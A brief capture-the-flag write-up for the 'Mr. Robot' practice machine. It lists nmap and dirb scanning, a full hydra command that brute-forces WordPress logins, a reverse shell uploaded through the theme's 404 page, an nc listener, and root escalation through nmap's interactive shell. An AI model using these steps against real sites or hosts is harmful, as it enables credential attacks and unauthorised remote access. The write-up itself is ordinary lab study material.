# - Mr.Robot WRITEUP- #

1. nmap scan it
2. dirb it and find wp-login.php
3. visit robots.txt for first flag and wordlist
4. Use hydra to bruteforce username on wp-login.php (-L is dynamic / -l is static)
    - `hydra -L fsocity.dic -p password IP  http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username" -t 30`

5. Find Elliot is Username / Password is employee number by search
6. Logged into Wordpress and seeing you can change php files
7. Upload reverse shell on 404 page
8. nc -lvnp (port of )

9. Trigger and connect to reverse shell

10. NMAP SUID to get root
- `/usr/local/bin/nmap --interactive`
- `nmap> !sh`

> You now have root and can search in root and in home/robot 
